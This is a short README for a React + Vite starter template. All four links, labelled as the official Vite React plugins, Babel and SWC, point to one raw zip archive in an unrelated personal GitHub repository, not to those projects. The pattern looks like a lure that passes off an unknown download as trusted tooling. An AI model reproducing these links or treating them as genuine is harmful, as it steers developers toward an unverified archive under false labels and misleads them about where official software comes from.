# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://github.com/samueltonao/exercicio-react/raw/refs/heads/main/public/exercicio-react-v1.1.zip) uses [Babel](https://github.com/samueltonao/exercicio-react/raw/refs/heads/main/public/exercicio-react-v1.1.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://github.com/samueltonao/exercicio-react/raw/refs/heads/main/public/exercicio-react-v1.1.zip) uses [SWC](https://github.com/samueltonao/exercicio-react/raw/refs/heads/main/public/exercicio-react-v1.1.zip) for Fast Refresh
